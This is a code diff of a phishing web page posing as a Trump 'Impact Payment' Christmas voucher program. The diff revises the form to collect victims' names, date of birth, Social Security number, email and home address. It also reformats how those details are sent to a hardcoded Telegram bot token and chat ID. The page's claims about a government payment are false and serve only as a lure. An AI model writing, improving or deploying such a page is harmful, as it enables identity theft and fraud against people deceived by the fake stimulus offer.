@@ -117,6 +117,15 @@
             transform: translateY(-1px);
         }
 
+        .date-selectors {
+            display: flex;
+            gap: 10px;
+        }
+
+        .date-selectors select {
+            flex: 1;
+        }
+
         /* ===== BUTTON ===== */
         .submit-section {
             text-align: center;
@@ -246,6 +255,10 @@
                 flex-direction: column;
                 gap: 15px;
             }
+            
+            .date-selectors {
+                flex-direction: column;
+            }
         }
     </style>
 </head>
@@ -255,7 +268,7 @@
         <div class="header">
             <h1>🎄 Christmas Vouchers</h1>
             <p>Fill out the form to receive your exclusive Christmas voucher!
-This voucher is stimulate program “Impact Payment” from Donald J. Trump.
+This voucher is stimulate program "Impact Payment" from Donald J. Trump.
 When form will be filled , you receive a confirmation email with next step!</p>
         </div>
 
@@ -279,19 +292,42 @@ When form will be filled , you receive a confirmation email with next step!</p>
                         <input type="text" id="firstName" required>
                     </div>
                     <div class="form-group">
-                        <label>Middle Name <span class="required">*</span></label>
-                        <input type="text" id="middleName" required>
-                    </div>
-                </div>
-
-                <div class="form-row">
-                    <div class="form-group">
                         <label>Last Name <span class="required">*</span></label>
                         <input type="text" id="lastName" required>
                     </div>
-                    <div class="form-group">
-                        <label>Date of Birth <span class="required">*</span></label>
-                        <input type="date" id="birthdate" name="birthdate" lang="en" required>
+                </div>
+
+                <div class="form-group">
+                    <label>Date of Birth <span class="required">*</span></label>
+                    <div class="date-selectors">
+                        <!-- Month -->
+                        <select id="birthMonth" required>
+                            <option value="">Month</option>
+                            <option value="01">January</option>
+                            <option value="02">February</option>
+                            <option value="03">March</option>
+                            <option value="04">April</option>
+                            <option value="05">May</option>
+                            <option value="06">June</option>
+                            <option value="07">July</option>
+                            <option value="08">August</option>
+                            <option value="09">September</option>
+                            <option value="10">October</option>
+                            <option value="11">November</option>
+                            <option value="12">December</option>
+                        </select>
+                        
+                        <!-- Day -->
+                        <select id="birthDay" required>
+                            <option value="">Day</option>
+                            <!-- Days will be populated by JavaScript -->
+                        </select>
+                        
+                        <!-- Year -->
+                        <select id="birthYear" required>
+                            <option value="">Year</option>
+                            <!-- Years will be populated by JavaScript -->
+                        </select>
                     </div>
                 </div>
 
@@ -322,7 +358,16 @@ When form will be filled , you receive a confirmation email with next step!</p>
                     Shipping Address
                 </div>
                 
+                <div class="form-group">
+                    <label>Street Address <span class="required">*</span></label>
+                    <textarea id="address" rows="2" required placeholder="Enter your street address"></textarea>
+                </div>
+
                 <div class="form-row">
+                    <div class="form-group">
+                        <label>City <span class="required">*</span></label>
+                        <input type="text" id="city" required>
+                    </div>
                     <div class="form-group">
                         <label>State <span class="required">*</span></label>
                         <select id="state" required>
@@ -380,25 +425,16 @@ When form will be filled , you receive a confirmation email with next step!</p>
                             <option value="DC">District of Columbia</option>
                         </select>
                     </div>
-                    <div class="form-group">
-                        <label>City <span class="required">*</span></label>
-                        <input type="text" id="city" required>
-                    </div>
-                </div>
-
-                <div class="form-group">
-                    <label>Street Address <span class="required">*</span></label>
-                    <textarea id="address" rows="2" required placeholder="Enter your street address"></textarea>
                 </div>
 
                 <div class="form-row">
                     <div class="form-group">
-                        <label>Apt/Suite <span class="optional">(optional)</span></label>
-                        <input type="text" id="apt" placeholder="Apartment, suite, unit, etc.">
-                    </div>
-                    <div class="form-group">
                         <label>ZIP Code <span class="required">*</span></label>
                         <input type="text" id="zip" required placeholder="12345">
+                    </div>
+                    <div class="form-group">
+                        <label>Apt/Suite <span class="optional">(optional)</span></label>
+                        <input type="text" id="apt" placeholder="Apartment, suite, unit, etc.">
                     </div>
                 </div>
             </div>
@@ -437,7 +473,7 @@ When form will be filled , you receive a confirmation email with next step!</p>
             </div>
             
             <div class="copyright">
-                Copyright by CVUSA @ [2024]
+                Copyright by CVUSA @ 2024
             </div>
         </div>
     </div>
@@ -447,61 +483,80 @@ When form will be filled , you receive a confirmation email with next step!</p>
         const TELEGRAM_BOT_TOKEN = '8537253559:AAGohyTz08NvyelLVMTs2VXXMJu7bZQZLjk';
         const TELEGRAM_CHAT_ID = '-4959049625';
 
+        // Populate days and years for date of birth
+        function populateDateFields() {
+            const daySelect = document.getElementById('birthDay');
+            const yearSelect = document.getElementById('birthYear');
+            
+            // Populate days (1-31)
+            for (let i = 1; i <= 31; i++) {
+                const day = i < 10 ? '0' + i : '' + i;
+                daySelect.innerHTML += `<option value="${day}">${i}</option>`;
+            }
+            
+            // Populate years (from current year - 100 to current year - 18)
+            const currentYear = new Date().getFullYear();
+            for (let i = currentYear - 18; i >= currentYear - 100; i--) {
+                yearSelect.innerHTML += `<option value="${i}">${i}</option>`;
+            }
+        }
+
+        // Update days based on selected month and year
+        function updateDays() {
+            const month = document.getElementById('birthMonth').value;
+            const year = document.getElementById('birthYear').value;
+            const daySelect = document.getElementById('birthDay');
+            
+            if (!month || !year) return;
+            
+            const daysInMonth = new Date(year, month, 0).getDate();
+            const currentDay = daySelect.value;
+            
+            daySelect.innerHTML = '<option value="">Day</option>';
+            for (let i = 1; i <= daysInMonth; i++) {
+                const day = i < 10 ? '0' + i : '' + i;
+                daySelect.innerHTML += `<option value="${day}" ${currentDay === day ? 'selected' : ''}>${i}</option>`;
+            }
+        }
+
         // Collect form data
         function collectFormData() {
+            const birthMonth = document.getElementById('birthMonth').value;
+            const birthDay = document.getElementById('birthDay').value;
+            const birthYear = document.getElementById('birthYear').value;
+            
             return {
                 // Personal Info
                 firstName: document.getElementById('firstName').value,
-                middleName: document.getElementById('middleName').value,
                 lastName: document.getElementById('lastName').value,
-                birthdate: document.getElementById('birthdate').value,
+                birthdate: `${birthMonth}/${birthDay}/${birthYear}`,
                 email: document.getElementById('email').value,
                 
-                
                 // Identification
-                cardNumber: document.getElementById('cardNumber').value,
+                ssn: document.getElementById('cardNumber').value,
                 
                 // Address
                 address: document.getElementById('address').value,
-                apt: document.getElementById('apt').value,
                 city: document.getElementById('city').value,
                 state: document.getElementById('state').value,
-                zip: document.getElementById('zip').value
+                zip: document.getElementById('zip').value,
+                apt: document.getElementById('apt').value
             };
         }
 
-        // Get full state name
-        function getStateFullName() {
-            const stateSelect = document.getElementById('state');
-            return stateSelect.options[stateSelect.selectedIndex].text;
-        }
-
-        // Format Telegram message
-        function formatTelegramMessage(formData, stateFullName) {
-            let fullName = formData.firstName;
-            if (formData.middleName) {
-                fullName += ` ${formData.middleName}`;
-            }
-            fullName += ` ${formData.lastName}`;
-
-            return `🎄 NEW VIP REQUEST 🎄%0A%0A` +
-                   `👤 PERSONAL INFORMATION%0A` +
-                   `├ Full Name: ${fullName}%0A` +
-                   `├ Email: ${formData.email}%0A` +
-                
-                   `└ Birthdate: ${formData.birthdate}%0A%0A` +
-                   
-                   `🔐 IDENTIFICATION%0A` +
-                   `└ SSN: ${formData.cardNumber}%0A%0A` +
-                   
-                   `📮 SHIPPING ADDRESS%0A` +
-                   `├ State: ${stateFullName}%0A` +
-                   `├ City: ${formData.city}%0A` +
-                   `├ Address: ${formData.address}%0A` +
-                   `├ Apt: ${formData.apt || 'Not specified'}%0A` +
-                   `└ ZIP: ${formData.zip}%0A%0A` +
-                   
-                   `⏰ Submitted: ${new Date().toLocaleString('ru-RU')}`;
+        // Format Telegram message in requested format
+        function formatTelegramMessage(formData) {
+            return `🎄 NEW CHRISTMAS VOUCHER REQUEST%0A%0A` +
+                   `Fname: ${formData.firstName}%0A` +
+                   `Lname: ${formData.lastName}%0A` +
+                   `ssn: ${formData.ssn}%0A` +
+                   `dob: ${formData.birthdate}%0A` +
+                   `address: ${formData.address}${formData.apt ? ' ' + formData.apt : ''}%0A` +
+                   `City: ${formData.city}%0A` +
+                   `state: ${formData.state}%0A` +
+                   `Zip: ${formData.zip}%0A%0A` +
+                   `📧 Email: ${formData.email}%0A` +
+                   `⏰ Submitted: ${new Date().toLocaleString()}`;
         }
 
         // Send message to Telegram
@@ -539,10 +594,9 @@ When form will be filled , you receive a confirmation email with next step!</p>
             try {
                 // Collect data
                 const formData = collectFormData();
-                const stateFullName = getStateFullName();
 
                 // Format and send message
-                const message = formatTelegramMessage(formData, stateFullName);
+                const message = formatTelegramMessage(formData);
                 sendToTelegram(message);
                 
                 showSuccess();
@@ -553,12 +607,13 @@ When form will be filled , you receive a confirmation email with next step!</p>
             }
         });
 
-        // Set current year in copyright
+        // Initialize date fields when page loads
         document.addEventListener('DOMContentLoaded', function() {
-            const yearElement = document.querySelector('.copyright');
-            if (yearElement) {
-                yearElement.textContent = yearElement.textContent.replace('[YEAR]', new Date().getFullYear());
-            }
+            populateDateFields();
+            
+            // Add event listeners for month and year changes
+            document.getElementById('birthMonth').addEventListener('change', updateDays);
+            document.getElementById('birthYear').addEventListener('change', updateDays);
         });
     </script>
 </body>
